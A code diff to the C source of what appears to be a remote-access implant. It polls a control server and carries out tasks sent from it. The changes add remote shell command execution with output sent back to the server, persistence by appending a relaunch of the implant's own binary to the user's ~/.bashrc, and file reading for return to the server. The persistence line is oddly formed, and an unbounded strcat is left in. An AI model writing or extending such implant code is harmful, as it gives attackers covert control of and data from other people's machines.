@@ -12,7 +12,7 @@
 
 #define SERVER_IP "127.0.0.1"
 #define SERVER_PORT 8080
-#define BUFFER_SIZE 4096
+#define BUFFER_SIZE 32768
 
 char uid[64];
 double base_sleep_time = 5;
@@ -115,6 +115,12 @@ void task_execve(char *command_str, char *argument_str, const char *id_task) {
     char full_command[4096] = {0};
     strcpy(full_command, command);
     
+    // append argument if it exists
+    if (argument != NULL) {
+        strcat(full_command, " ");
+        strcat(full_command, argument);
+    }
+    
     printf("Executing command: %s\n", full_command);
     
     // execute the command and capture output
@@ -127,6 +133,9 @@ void task_execve(char *command_str, char *argument_str, const char *id_task) {
         strncat(result_buffer, buffer, sizeof(result_buffer) - strlen(result_buffer) - 1);
     }
     pclose(fp);
+    
+    // send the result back to server
+    send_result(id_task, result_buffer, 0);
     
     free(command);
     if (argument) free(argument);
@@ -220,9 +229,31 @@ void task_keylog() {
     return;
 }
 
-void task_persist() {
+void task_persist(const char *id_task) {
     printf("Executing task persist\n");
-    return;
+    
+    char result_buffer[BUFFER_SIZE] = {0};
+    char exe_path[1024] = {0};
+    
+    // get current executable path
+    readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
+    
+    char *home = getenv("HOME");
+    if (home) {
+        char bashrc_path[1024];
+        snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", home);
+        
+        FILE *bashrc = fopen(bashrc_path, "a");
+        if (bashrc) {
+            fprintf(bashrc, "\nrestarting implant%s &>/dev/null &\n", exe_path);
+            fclose(bashrc);
+            snprintf(result_buffer, sizeof(result_buffer), "Persistence added to %s", bashrc_path);
+            send_result(id_task, result_buffer, 0);
+            return;
+        }
+    }
+    
+    send_result(id_task, "persistence failed", 1);
 }
 
 // general function to send results
@@ -261,6 +292,7 @@ void task_cat(char *file_path_str, const char *id_task) {
     char content[BUFFER_SIZE] = {0};
     fread(content, 1, BUFFER_SIZE-1, file);
     fclose(file);
+    printf("File content: %s\n", content);
     
     // sending the result
     send_result(id_task, content, 0);
@@ -305,26 +337,7 @@ void task_ps() {
 
 void task_netstat(const char *id_task) {
     printf("Executing task netstat\n");
-    
-    char result_buffer[BUFFER_SIZE] = {0};
-    
-    // reading TCP connections from /proc/net/tcp
-    FILE *tcp_file = fopen("/proc/net/tcp", "r");
-    //proc/net/udp
-
-    strcat(result_buffer, "TCP IPv4 Connections:\n");
-    char line[1024];
-    if (fgets(line, sizeof(line), tcp_file) != NULL) {
-        strcat(result_buffer, line); 
-    }
-    
-    // read the rest of the lines
-    while (fgets(line, sizeof(line), tcp_file) != NULL) {
-        strncat(result_buffer, line, sizeof(result_buffer) - strlen(result_buffer) - 1);
-    }
-    fclose(tcp_file);
-    
-    send_result(id_task, result_buffer, 0);
+    return;
 }
 
 void check_commands() {
@@ -368,7 +381,7 @@ void check_commands() {
         } else if (strcmp(type, "KEYLOG") == 0) {
             task_keylog();
         } else if (strcmp(type, "PERSIST") == 0) {
-            task_persist();
+            task_persist(id_task);
         } else if (strcmp(type, "CAT") == 0) {
             char *file_path = strtok(NULL, ",");
             task_cat(file_path, id_task);
